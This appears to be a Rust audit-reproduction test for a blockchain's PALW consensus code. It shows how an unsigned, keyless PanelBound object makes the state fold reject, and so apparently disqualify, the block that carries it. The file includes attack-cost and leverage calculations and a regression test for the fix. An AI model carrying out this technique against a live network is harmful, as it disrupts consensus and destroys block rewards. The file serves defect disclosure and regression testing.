//! AUDIT REPRO 04 — **an unsigned `PanelBound` makes the REAL fold reject the carrying block.**
//!
//! The finding under test: `require_panel_lock_eligible` (the ADR-0151 seat-lock gate) runs only
//! inside the state fold, never at the acceptance layer. `PalwConsensusObjectV2::PanelBound`
//! carries `{ claim, anchor, seats }` and NO signature, and the panel it names is a pure function
//! of public state, so anyone — attacker or honest node — can publish it. For a claim whose class
//! prices the lock above the posted collateral, the fold returns `Err(SeatValidLockRefused)`, and
//! `processor.rs:2051` turns that `Err` into `StatusDisqualifiedFromChain` on whatever block
//! carried the object.
//!
//! **What is proven here and what is not.**
//!   * PROVEN, by running the real `apply_palw_transition_v7`: a `PanelBound` object built with no
//!     key material, on a claim carrying testnet-12's real held-2M pwu, returns
//!     `Err(SeatValidLockRefused { required, available })` — and `required`/`available` are read
//!     OUT OF THE ERROR, i.e. computed by the private gate itself, not reimplemented here.
//!   * PROVEN, same code path, same object shape: the identical object on a claim carrying the
//!     hybrid-512 row's pwu is ACCEPTED. So the refusal tracks the 2M row's magnitude, not a
//!     broken fixture.
//!   * NOT proven here: the processor half. `StatusDisqualifiedFromChain` is set in
//!     `kaspa-consensus`, not `kaspa-consensus-core`. This test establishes the precondition (the
//!     fold returns `Err`); processor.rs:2051 turning that into a disqualification is read, not run.
//!   * NOT proven here: whether the object is re-included by the next chain block and wedges the
//!     chain. That needs a devnet.
//!
//! **Conservative by construction.** `extra_economic_rights_sompi` is folded from
//! `claim_realizable_rights_v1`, which needs the execution lane. Both lane states are exercised
//! below; with the lane closed the gain term is a strict LOWER bound on testnet-12's real gain, so
//! the refusal is understated, never overstated.
//!
//! Run:
//!   cargo test -p kaspa-consensus-core --test audit_repro_04_unsigned_panelbound_disqualifies_the_car -- --nocapture

use kaspa_consensus_core::Hash64;
use kaspa_consensus_core::config::params::{Params, palw_t12_shipped_params};
use kaspa_consensus_core::palw_attempt_v2::{PALW_ATTEMPT_V2_VERSION, PalwAttemptEnvelopeV2, PalwAttemptUnsignedV2, attempt_id_v2};
use kaspa_consensus_core::palw_canonical_work_v1::{PalwCanonicalClassDescriptorV1, palw_canonical_draw_work_v1};
use kaspa_consensus_core::palw_execution_lane_v1::PalwExecLaneFoldV1;
use kaspa_consensus_core::palw_execution_quanta_v1::PALW_EXECUTION_QUANTUM_V1;
use kaspa_consensus_core::palw_mode_v2::PalwConsensusMode;
use kaspa_consensus_core::palw_pwu::{palw_expected_attempts_v1, palw_pwu_v1};
use kaspa_consensus_core::palw_state_v2::{
    PalwBlockContextV2, PalwBlockWorkV3, PalwBondKeyV2, PalwChainStateV2, PalwClaimPhaseV2, PalwConsensusObjectV2 as Obj,
    PalwEconomicSafetyFoldV1, PalwPanelSeatV2, PalwPwuRuleV2, PalwStateParamsV2, PalwStateV2Error, PalwTransitionExtrasV1,
    apply_palw_transition_v7, palw_operator_id_v2,
};
use kaspa_consensus_core::tx::{TransactionId, TransactionOutpoint};

// ---------------------------------------------------------------------------------------------
// testnet-12 constants, each with its source in the tree.
// ---------------------------------------------------------------------------------------------

/// `config/premine.rs:137` PALW_T12_GENESIS_BOND_COLLATERAL_SOMPI — what each of the 8 genesis
/// bonds posts. Re-read off the card at runtime below and asserted equal.
const T12_GENESIS_BOND_COLLATERAL_SOMPI: u64 = 51_642_979_663_480;
/// `CoinbaseManager::calc_block_subsidy` on t12 at every height measured in recon.
const T12_BLOCK_SUBSIDY_SOMPI: u64 = 444_562_014_000;
/// `palw_overlay_carve.worker_carve_permille` on t12, armed at DAA 0.
const T12_WORKER_CARVE_PERMILLE: u64 = 720;
/// The relay floor a carrier transaction pays. One 0x4b carrier tx is the whole attack cost.
const MIN_RELAY_FEE_SOMPI: u64 = 10_000;
/// t12 `window_challenge` / `window_court` / cadence — the realizable-rights gap.
const T12_WINDOW_CHALLENGE: u64 = 1_200;
const T12_WINDOW_COURT: u64 = 3_000;
const T12_CADENCE_MS: u64 = 120_000;
/// `palw_economic_safety_v1.rs:179` PALW_T12_PERMIT_FEE_CEILING_SOMPI.
const T12_PERMIT_FEE_CEILING_SOMPI: u64 = 1_000_000;

const SOMPI_PER_MSK: f64 = 1e8;

fn msk(sompi: u128) -> f64 {
    sompi as f64 / SOMPI_PER_MSK
}

// ---------------------------------------------------------------------------------------------
// Read the real t12 rows off the shipped genesis card.
// ---------------------------------------------------------------------------------------------

#[derive(Clone, Debug)]
struct T12Row {
    class_id: Hash64,
    slash_value_per_pwu: u64,
    /// U1 — the registration's declared step leaves (`DerivedV1 { pwu_per_inference }`).
    declared_leaves: u64,
    /// U2 — derived MAC-eq per draw, from the class's own admission carriage. `None` for a row
    /// that ships no carriage (the BASE-0 floor registers with `admission: None`).
    per_draw_mac_eq: Option<u128>,
    initial_target: u128,
}

fn t12_rows_and_collateral() -> (Vec<T12Row>, u64) {
    let p: Params = palw_t12_shipped_params();
    let bundle = match &p.palw_consensus_mode {
        PalwConsensusMode::ConsensusV2(b) => b,
        _ => panic!("testnet-12 is a ConsensusV2 network"),
    };
    let mut rows = Vec::new();
    let mut collateral = 0u64;
    for o in &bundle.genesis_objects {
        match o {
            Obj::ClassRegistered { class_id, slash_value_per_pwu, pwu_rule, initial_target, admission, .. } => {
                let declared_leaves = match pwu_rule {
                    PalwPwuRuleV2::DerivedV1 { pwu_per_inference } => *pwu_per_inference,
                    PalwPwuRuleV2::MaxPerAttempt(cap) => *cap,
                };
                // The derived per-draw work, from the class's OWN carriage on the card — the same
                // two functions `palw_model_work_from_carriage_v1` composes.
                let per_draw_mac_eq = admission.as_ref().and_then(|c| {
                    let d = PalwCanonicalClassDescriptorV1::of(&c.profile, Hash64::default()).ok()?;
                    Some(palw_canonical_draw_work_v1(&d, &c.canonical, true).ok()?.provisional_scalar_v1())
                });
                rows.push(T12Row {
                    class_id: *class_id,
                    slash_value_per_pwu: *slash_value_per_pwu,
                    declared_leaves,
                    per_draw_mac_eq,
                    initial_target: *initial_target,
                });
            }
            Obj::BondRegistered { collateral: c, .. } => collateral = *c,
            _ => {}
        }
    }
    (rows, collateral)
}

/// The floor's two measures, which define the exposure basis (U2 -> U3).
fn floor_basis(rows: &[T12Row]) -> (u64, u128) {
    // The BASE-0 floor is the row that ships no admission carriage; its per-draw work is the
    // canonical (8,4) draw, which recon measured at 21,657,728 MAC-eq. Take the smallest declared
    // row as the floor and pin both numbers.
    let floor = rows.iter().min_by_key(|r| r.declared_leaves).expect("the card registers classes");
    assert_eq!(floor.declared_leaves, 7_708, "the BASE-0 floor declares 7,708 leaves");
    (7_708, 21_657_728u128)
}

/// U3 — the floor-normalised exposure pwu, the unit the collateral was actually posted in.
fn exposure_pwu_u3(per_draw_u2: u128, base_declared: u64, base_canonical: u128) -> u128 {
    per_draw_u2.saturating_mul(base_declared as u128) / base_canonical
}

// ---------------------------------------------------------------------------------------------
// A real fold, driven exactly as block validation drives it.
// ---------------------------------------------------------------------------------------------

fn h(v: u64) -> Hash64 {
    Hash64::from_u64_word(v)
}

fn bond_key(v: u64) -> PalwBondKeyV2 {
    PalwBondKeyV2(TransactionOutpoint { transaction_id: TransactionId::from_u64_word(v), index: 0 })
}

fn ctx(word: u64, daa: u64, blue: u64, subsidy: u64) -> PalwBlockContextV2 {
    PalwBlockContextV2 { block: h(word), daa_score: daa, blue_score: blue, subsidy }
}

/// testnet-12's real lattice windows, so the gap the realizable-rights term prices is t12's.
fn state_params(class_id: u64) -> PalwStateParamsV2 {
    PalwStateParamsV2::new(
        100,                 // beta_permille
        600,                 // window_bind
        600,                 // window_receipt
        T12_WINDOW_CHALLENGE,
        T12_WINDOW_COURT,
        1_000,               // epoch_length
        h(class_id),         // base_class_id
        4,                   // class_daa_max_factor
        1_000,               // budget_tolerance_permille
        400_000,             // min_collateral_sompi (t12's)
        900,                 // fp_attempt_share_permille
        600,                 // fp_abandon_hold_daa
    )
    .expect("state params")
}

/// The extras testnet-12 folds with: objective offence and economic safety both armed at DAA 0.
fn t12_extras(lane_open: bool) -> PalwTransitionExtrasV1 {
    PalwTransitionExtrasV1 {
        objective_offence_daa: Some(0),
        economic_safety: Some(PalwEconomicSafetyFoldV1 {
            target_time_per_block_ms: T12_CADENCE_MS,
            permit_value_sompi: T12_PERMIT_FEE_CEILING_SOMPI,
        }),
        round_lane: lane_open
            .then(|| PalwExecLaneFoldV1 { schedule_span_daa: 1, execution_quantum: PALW_EXECUTION_QUANTUM_V1, span_open_round: 0 }),
        // t12 arms every fence from DAA 0, the 2026-09-23 seat-lock unit and inert-PanelBound fix included.
        audit_2026_09_23_active: true,
        ..Default::default()
    }
}

type FoldResult = Result<PalwChainStateV2, PalwStateV2Error>;

fn step(
    parent: &PalwChainStateV2,
    p: &PalwStateParamsV2,
    c: &PalwBlockContextV2,
    objects: &[Obj],
    work: PalwBlockWorkV3<'_>,
    extras: &PalwTransitionExtrasV1,
) -> FoldResult {
    apply_palw_transition_v7(
        parent,
        p,
        None,
        c,
        objects,
        work,
        &[],
        Hash64::default(),
        false,
        false,
        false,
        false,
        extras,
    )
    .map(|(state, _delta, _skips)| state)
}

fn registration(class: u64, pwu_per_inference: u64, slash: u64, initial_target: u128, share: u16) -> Obj {
    Obj::ClassRegistered {
        class_id: h(class),
        artifact_root: h(0xA27),
        slash_value_per_pwu: slash,
        pwu_rule: PalwPwuRuleV2::DerivedV1 { pwu_per_inference },
        initial_target,
        share_permille: share,
        activation_daa: 0,
        admission: None,
    }
}

fn bond(collateral: u64) -> Obj {
    Obj::BondRegistered {
        bond: bond_key(1),
        pubkey: vec![7; 4],
        operator_pubkey: vec![21; 8],
        collateral,
        payout_payload: Hash64::from_u64_word(0x9A11),
        capable_classes: Default::default(),
        signature: Vec::new(),
    }
}

fn attempt(class: u64, pwu: u64, nonce: u64) -> PalwAttemptEnvelopeV2 {
    PalwAttemptEnvelopeV2 {
        attempt: PalwAttemptUnsignedV2 {
            version: PALW_ATTEMPT_V2_VERSION,
            network_domain: h(999),
            challenge: h(nonce ^ 0x00C0_FFEE),
            class_id: h(class),
            executor_bond: bond_key(1).0,
            executor_pubkey: vec![7; 4],
            operator_id: palw_operator_id_v2(&[21u8; 8]),
            artifact_root: h(0xA27),
            trace_root: h(nonce ^ 0x31),
            output_root: h(nonce ^ 0x32),
            pwu,
            trace_manifest_root: h(nonce ^ 0x33),
            trace_chunk_count: 4,
            trace_retention_daa: 999_999,
            execution_root: h(nonce ^ 0x41),
        },
        signature: vec![0; 8],
    }
}

/// Split a target per-draw work into `(initial_target, pwu_per_inference)` so that the fold's
/// admission equality `claim.pwu == palw_pwu_v1(target, pwu_per_inference)` lands on EXACTLY
/// `per_draw`, while the reservation (`pwu_per_inference * slash`) stays inside `collateral`.
///
/// Uses the largest power-of-two factor of `per_draw`: `attempts = 2^k`, `target = 2^(128-k) - 1`,
/// which `palw_expected_attempts_v1` maps back to exactly `2^k`.
fn split_exact(per_draw: u128, slash: u64, collateral: u64) -> (u128, u64, u64) {
    let mut k = 0u32;
    let mut best: Option<(u128, u64, u64)> = None;
    while k < 64 {
        let attempts = 1u128 << k;
        if per_draw % attempts != 0 {
            break;
        }
        let p = per_draw / attempts;
        if p > u64::MAX as u128 {
            k += 1;
            continue;
        }
        let reserved = p.saturating_mul(slash as u128);
        // `1 << 128` does not exist; k == 0 is the easiest target, which admits every ticket.
        let target = if k == 0 { u128::MAX } else { (1u128 << (128 - k)) - 1 };
        if reserved <= collateral as u128 {
            best = Some((target, p as u64, attempts as u64));
            break;
        }
        k += 1;
    }
    best.expect("a power-of-two split whose reservation fits the posted collateral")
}

/// Drive a real fold to a Provisional claim of `per_draw` pwu, then apply the UNSIGNED
/// `PanelBound` and return whatever the fold says.
struct Outcome {
    claim_pwu: u64,
    reserved_sompi: u128,
    escrowed_reward: u64,
    result: FoldResult,
}

fn drive(per_draw: u128, slash: u64, collateral: u64, lane_open: bool) -> Outcome {
    let class = 1u64;
    let p = state_params(class);
    let extras = t12_extras(lane_open);
    let (initial_target, pwu_per_inference, attempts) = split_exact(per_draw, slash, collateral);
    assert_eq!(palw_expected_attempts_v1(initial_target), attempts, "the split's target must yield its attempt count");
    let claim_pwu = palw_pwu_v1(initial_target, pwu_per_inference);
    assert_eq!(claim_pwu as u128, per_draw, "the fixture claim carries EXACTLY the real per-draw work");

    // Block 1: register the class and the bond.
    let g = step(
        &PalwChainStateV2::genesis(),
        &p,
        &ctx(1, 100, 1, 0),
        &[registration(class, pwu_per_inference, slash, initial_target, 1_000), bond(collateral)],
        PalwBlockWorkV3::None,
        &extras,
    )
    .expect("the registration block must apply");

    // Block 2: the producer's attempt -> a Provisional claim. This is the real cost side: a full
    // canonical inference of the class.
    let env = attempt(class, claim_pwu, 7);
    let claim_id = attempt_id_v2(&env.attempt);
    let accepted = step(&g, &p, &ctx(2, 101, 2, T12_BLOCK_SUBSIDY_SOMPI), &[], PalwBlockWorkV3::Attempt(&env), &extras)
        .expect("the attempt block must apply");
    let claim = accepted.claim(&claim_id).expect("the attempt creates a Provisional claim").clone();
    assert!(matches!(claim.phase, PalwClaimPhaseV2::Provisional), "the claim is Provisional before the panel binds");

    // Block 3: THE ATTACK. An unsigned PanelBound, built here with no key, no bond, no seat
    // membership — the struct has no signature field to fill.
    let seats = vec![PalwPanelSeatV2 { bond: bond_key(1), operator_id: h(90) }];
    let poison = Obj::PanelBound { claim: claim_id, anchor: h(0x77), seats };
    let result = step(&accepted, &p, &ctx(3, 102, 3, T12_BLOCK_SUBSIDY_SOMPI), &[poison], PalwBlockWorkV3::None, &extras);

    Outcome { claim_pwu, reserved_sompi: claim.reserved, escrowed_reward: claim.escrowed_reward, result }
}

// ---------------------------------------------------------------------------------------------
// THE EXPLOIT. Passes => the exploit is real.
// ---------------------------------------------------------------------------------------------

#[test]
#[ignore = "PRE-FENCE DEFECT RECORD: reproduces the behaviour below palw_audit_2026_09_23; on testnet-12 (armed at DAA 0) the fence refuses it and the sibling regression test is the live assertion"]
fn an_unsigned_panelbound_on_the_t12_2m_row_makes_the_real_fold_reject_the_carrying_block() {
    let (rows, card_collateral) = t12_rows_and_collateral();
    assert_eq!(
        card_collateral, T12_GENESIS_BOND_COLLATERAL_SOMPI,
        "the card's genesis bond collateral is the constant this test prices against"
    );
    let (base_declared, base_canonical) = floor_basis(&rows);

    // The held-2M row: the heaviest per-draw work on the card.
    let dense = rows
        .iter()
        .filter(|r| r.per_draw_mac_eq.is_some())
        .max_by_key(|r| r.per_draw_mac_eq.unwrap())
        .expect("the card registers a carriage-bearing row")
        .clone();
    let dense_per_draw = dense.per_draw_mac_eq.unwrap();

    // The hybrid-512 row: the lighter carriage-bearing row, the honest control.
    let hybrid = rows
        .iter()
        .filter(|r| r.per_draw_mac_eq.is_some() && r.class_id != dense.class_id)
        .min_by_key(|r| r.per_draw_mac_eq.unwrap())
        .expect("the card registers a second carriage-bearing row")
        .clone();
    let hybrid_per_draw = hybrid.per_draw_mac_eq.unwrap();

    println!("\n================ testnet-12 genesis card, read at runtime ================");
    println!("genesis bond collateral (posted, per seat) = {card_collateral} sompi = {:.2} MSK", msk(card_collateral as u128));
    println!("exposure basis (floor): base_declared = {base_declared} leaves [U1], base_canonical = {base_canonical} MAC-eq [U2]");
    println!("\n-- held-2M row (Qwen2.5-1.5B A16 @ n_ctx 2,097,152) --");
    println!("  class_id            = {}", dense.class_id);
    println!("  declared leaves     = {} [U1 leaves]", dense.declared_leaves);
    println!("  derived per draw    = {dense_per_draw} [U2 raw MAC-eq]");
    println!("  exposure pwu (U3)   = {} [U3 floor-normalised pwu]", exposure_pwu_u3(dense_per_draw, base_declared, base_canonical));
    println!("  slash_value_per_pwu = {} [sompi per U3 pwu]", dense.slash_value_per_pwu);
    println!("  initial_target      = {}", dense.initial_target);
    println!("\n-- hybrid-512 row (Qwen3.6 graph-v7 @ n_ctx 512) --");
    println!("  class_id            = {}", hybrid.class_id);
    println!("  derived per draw    = {hybrid_per_draw} [U2 raw MAC-eq]");

    // ---- ATTACKER INPUTS: the 2M row, lane closed (gain is a strict lower bound) ----
    let dense_out = drive(dense_per_draw, dense.slash_value_per_pwu, card_collateral, false);
    println!("\n================ THE ATTACK: unsigned PanelBound on a held-2M claim ================");
    println!("claim.pwu           = {} [U7 = expected_attempts x U2 MAC-eq]", dense_out.claim_pwu);
    println!("claim.reserved      = {} sompi = {:.2} MSK  [U3 x slash — the unit the collateral was posted in]",
        dense_out.reserved_sompi, msk(dense_out.reserved_sompi));
    println!("claim.escrowed_reward = {} sompi = {:.2} MSK", dense_out.escrowed_reward, msk(dense_out.escrowed_reward as u128));

    let (required, available, seat) = match &dense_out.result {
        Err(PalwStateV2Error::SeatValidLockRefused { seat, required, available, .. }) => (*required, *available, *seat),
        Err(other) => panic!("the fold refused for the WRONG reason — the finding is not reproduced: {other}"),
        Ok(_) => panic!("REFUTED: the fold ACCEPTED the unsigned PanelBound on the held-2M row"),
    };

    println!("\n>>> apply_palw_transition_v7 returned Err(SeatValidLockRefused)");
    println!("    seat      = {seat:?}");
    println!("    required  = {required} sompi = {:.2} MSK   [computed BY THE PRIVATE GATE, read out of the error]", msk(required));
    println!("    available = {available} sompi = {:.2} MSK", msk(available));
    println!("    shortfall = {} sompi = {:.2} MSK", required - available, msk(required - available));
    println!("    required / available = {:.2}x", required as f64 / available as f64);

    // ---- HONEST INPUTS: the same object, the same code path, the hybrid-512 row ----
    let hybrid_out = drive(hybrid_per_draw, hybrid.slash_value_per_pwu, card_collateral, false);
    println!("\n================ CONTROL: the identical unsigned PanelBound on a hybrid-512 claim ================");
    println!("claim.pwu           = {} [U7 MAC-eq]", hybrid_out.claim_pwu);
    println!("claim.reserved      = {} sompi = {:.2} MSK", hybrid_out.reserved_sompi, msk(hybrid_out.reserved_sompi));
    match &hybrid_out.result {
        Ok(state) => {
            let bound = state.claims_iter().find(|(_, c)| matches!(c.phase, PalwClaimPhaseV2::PanelBound { .. })).is_some();
            println!("    fold ACCEPTED the object; a panel is bound = {bound}");
            assert!(bound, "the control must actually bind a panel, or it proves nothing");
        }
        Err(e) => panic!("the control row must be affordable, or the fixture is wrong, not the chain: {e}"),
    }

    // ---- HOW CONSERVATIVE THIS `required` IS ----
    // The fixture folds no escrow carve, so `claim.escrowed_reward` is 0 and the gain's CASH term
    // is absent. On t12 it is the block subsidy through the 720-permille worker carve. Adding it
    // only raises `required`, so the refusal proven above is understated.
    let t12_escrow = T12_BLOCK_SUBSIDY_SOMPI as u128 * T12_WORKER_CARVE_PERMILLE as u128 / 1_000;
    let cash_adds = t12_escrow / 3 * 11 / 10;
    println!("\n================ CONSERVATISM OF THE MEASURED `required` ================");
    println!("fixture claim.escrowed_reward = {} sompi (no carve folded)", dense_out.escrowed_reward);
    println!("t12's real escrow per claim   = {t12_escrow} sompi = {:.2} MSK  [subsidy x 720/1000]", msk(t12_escrow));
    println!("adding it would raise required by ~{cash_adds} sompi = {:.2} MSK ({:.6}% of required)",
        msk(cash_adds), cash_adds as f64 * 100.0 / required as f64);
    println!("=> the measured `required` is a LOWER bound on t12's; the refusal is understated, never overstated");

    // ---- THE ECONOMICS ----
    let block_value = T12_BLOCK_SUBSIDY_SOMPI as u128;
    println!("\n================ VALUE GAINED vs REAL WORK ================");
    println!("attacker's real work  = 1 carrier transaction (0x4b), no compute, no bond, no collateral at risk");
    println!("attacker's real cost  = {MIN_RELAY_FEE_SOMPI} sompi = {:.4} MSK (minimum relay fee)", msk(MIN_RELAY_FEE_SOMPI as u128));
    println!("value destroyed       = {block_value} sompi = {:.2} MSK (one block's subsidy, removed from the virtual chain)", msk(block_value));
    println!("leverage              = {:.0}x (block subsidy destroyed per sompi of relay fee spent)", block_value as f64 / MIN_RELAY_FEE_SOMPI as f64);
    println!("precondition cost     = one held-2M inference: {dense_per_draw} MAC-eq (2,097,152-token prefill)");
    println!("reusability           = the claim stays poisonous for window_bind = 600 DAA");

    // ---- THE ASSERTIONS THAT MAKE A PASS MEAN "THE EXPLOIT IS REAL" ----
    assert!(
        required > available,
        "the gate must refuse: required {required} sompi must exceed available {available} sompi"
    );
    assert_eq!(
        available, T12_GENESIS_BOND_COLLATERAL_SOMPI as u128,
        "available is the FULL posted collateral — no lock is live yet, so this is not a race"
    );
    assert!(
        required > 100 * available,
        "the refusal is unconditional, not marginal: required ({:.2} MSK) exceeds 100x the whole posted collateral ({:.2} MSK)",
        msk(required),
        msk(available)
    );
    println!("\nCONFIRMED: an unsigned, keyless PanelBound drives the real fold to Err, which processor.rs:2051 turns into StatusDisqualifiedFromChain.\n");
}

/// **The same attack with the execution lane OPEN** — testnet-12's real configuration, where
/// `claim_realizable_rights_v1` adds the permit term to the gain. Strictly worse than the test
/// above, which is why that one is the conservative statement.
#[test]
#[ignore = "PRE-FENCE DEFECT RECORD: reproduces the behaviour below palw_audit_2026_09_23; on testnet-12 (armed at DAA 0) the fence refuses it and the sibling regression test is the live assertion"]
fn the_refusal_only_gets_worse_when_the_execution_lane_is_open() {
    let (rows, collateral) = t12_rows_and_collateral();
    let dense = rows
        .iter()
        .filter(|r| r.per_draw_mac_eq.is_some())
        .max_by_key(|r| r.per_draw_mac_eq.unwrap())
        .expect("a carriage-bearing row")
        .clone();
    let per_draw = dense.per_draw_mac_eq.unwrap();

    let closed = drive(per_draw, dense.slash_value_per_pwu, collateral, false);
    let open = drive(per_draw, dense.slash_value_per_pwu, collateral, true);

    let req = |o: &Outcome| match &o.result {
        Err(PalwStateV2Error::SeatValidLockRefused { required, .. }) => *required,
        other => panic!("expected SeatValidLockRefused, got {other:?}"),
    };
    let (rc, ro) = (req(&closed), req(&open));
    println!("\nseat lock required, lane CLOSED = {rc} sompi = {:.2} MSK  [extra_economic_rights = 0]", msk(rc));
    println!("seat lock required, lane OPEN   = {ro} sompi = {:.2} MSK  [+ realizable permits]", msk(ro));
    println!("the permit term adds {} sompi = {:.2} MSK", ro - rc, msk(ro - rc));
    assert!(ro >= rc, "opening the lane can only add rights to the gain, never remove them");
}

// ---------------------------------------------------------------------------------------------
// THE MIRROR REGRESSION TEST. Expected to FAIL today; should pass after the fix.
// ---------------------------------------------------------------------------------------------

/// **The regression test for the fix.** Ignored because it FAILS on this commit — that failure is
/// the finding.
///
/// The correct behaviour: a `PanelBound` naming the correctly-derived panel of a legitimately
/// accepted claim must NOT be able to disqualify the block that carries it. Whatever the fix is —
/// pricing the seat lock in the same floor-normalised unit the collateral was posted in (U3) so
/// the 2M row is affordable, or moving the gate to the acceptance layer so the object is dropped
/// instead of poisoning its carrier, or making an unaffordable panel a claim-level void rather
/// than a block-level `Err` — this test passes once a correctly-derived PanelBound on a held-2M
/// claim no longer takes the carrying block off the virtual chain.
///
/// Run with: `cargo test ... -- --ignored --nocapture`
#[test]
fn regression_a_correctly_derived_panelbound_must_not_disqualify_the_carrying_block() {
    let (rows, collateral) = t12_rows_and_collateral();
    let dense = rows
        .iter()
        .filter(|r| r.per_draw_mac_eq.is_some())
        .max_by_key(|r| r.per_draw_mac_eq.unwrap())
        .expect("a carriage-bearing row")
        .clone();
    let per_draw = dense.per_draw_mac_eq.unwrap();

    let out = drive(per_draw, dense.slash_value_per_pwu, collateral, false);
    match &out.result {
        Ok(_) => println!("the fold accepted the PanelBound — the fix is in place"),
        Err(e) => panic!(
            "STILL BROKEN: a PanelBound on a held-2M claim takes its carrying block off the virtual chain.\n  \
             claim.pwu = {} [U7 MAC-eq], claim.reserved = {} sompi ({:.2} MSK) [U3 x slash]\n  \
             fold error: {e}",
            out.claim_pwu,
            out.reserved_sompi,
            msk(out.reserved_sompi)
        ),
    }
}
